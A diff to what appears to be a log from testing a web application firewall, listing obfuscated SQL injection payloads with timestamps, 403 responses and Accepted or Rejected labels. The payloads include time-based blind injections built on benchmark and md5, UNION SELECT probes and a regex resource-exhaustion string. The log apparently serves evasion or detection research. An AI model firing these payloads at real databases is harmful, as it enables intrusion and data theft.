@@ -6110,3 +6110,18 @@ q' NOT LIKE '	qa')'))/**/AS rupb
 whERE  oR 0 LIKE (sELecT  OR 0) or make_set(4954=4299 LIke 4299,1836)--",2024-09-04T13:18:56.550316,403,2024-09-04T13:19:01.577610,Rejected
 2024-09-04T13:19:02.596309,"-(SeLeCt/**/' q' NOT LIKE '	qa')'))/*p<G }*/as rupb
 WhEre  oR 5827 like 5827 liKE/**/(SeLECT  || (sELECT 1)) Or make_set(4954=4299 Like 0x10cb,1836)--",2024-09-04T13:19:02.608842,403,2024-09-04T13:19:09.514194,Accepted
+2026-03-31T13:40:39.672041,leiro,2026-03-31T13:40:39.686449,200,2026-03-31T13:40:40.713480,Accepted
+2026-03-31T13:40:40.890804,leiro,2026-03-31T13:40:40.896889,200,2026-03-31T13:40:41.539803,Accepted
+2026-03-31T13:40:42.547234,leiro,2026-03-31T13:40:42.551497,200,2026-03-31T13:40:42.889657,Accepted
+2026-03-31T13:48:12.612717,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",2026-03-31T13:48:12.619304,403,2026-03-31T13:48:18.249752,Accepted
+2026-03-31T13:48:18.258816,"1' or (SELECT 3883)=(SELECT 1)  = 
+benchmark  (  5000000,md5  (  0x694a4745   )  /**/ )    and 'ntaw'  =  'ntaw",2026-03-31T13:48:18.262052,403,2026-03-31T13:48:24.897209,Rejected
+2026-03-31T13:48:25.910038,"1' or (SELECT ' like '!='=$')=(SELECT 1)  =  benchmark  (  (SELECT (SELECT 1)),md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",2026-03-31T13:48:25.917075,403,2026-03-31T13:48:33.771925,Rejected
+2026-03-31T13:52:52.315695,"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""isbh"" like ""isbh",2026-03-31T13:52:52.321899,403,2026-03-31T13:53:03.659438,Accepted
+2026-03-31T13:53:03.671537,"&& 1""   )    )    or char  (/*fkGhH*/ 68  )  ||char  (  69  )  ||char  (  (SELECT 97)  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,'<D'='<D'
+ )  ,5000000000  )  ,null  )   and    (    (   ""isbh"" like ""isbh",2026-03-31T13:53:03.680586,403,2026-03-31T13:53:18.334838,Accepted
+2026-03-31T13:53:19.348756,"and  1""   )    )    or char  (/*fkGhH*/ 7347<>7348  )  ||char  (  0x45  )  ||char  (  (SELECT 97)  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,'<D'='<D'	 )  , OR 0  )  ,null  )   and    (    (  /*.)*/""isbh"" like ""isbh",2026-03-31T13:53:19.356872,403,2026-03-31T13:53:33.177703,Accepted
+2026-03-31T13:54:24.917326,"-4304' where 1005  =  1005 union all select 1005,1005#",2026-03-31T13:54:24.923362,403,2026-03-31T13:54:27.864247,Rejected
+2026-03-31T13:54:27.878307,"-1367/**/not like  AND 1' WHERe 1005  =  1005 union all	SeleCT (SELECT 1005),1005#T",2026-03-31T13:54:27.883815,403,2026-03-31T13:54:31.338704,Rejected
+2026-03-31T13:54:32.363096,"- oR 0 not like  and 0x1' WHERE 3993 NOT LIKE 3994   LiKE   1005 union all
+SelEct (seleCT 1005),1005#T",2026-03-31T13:54:32.368396,403,2026-03-31T13:54:36.481102,Rejected
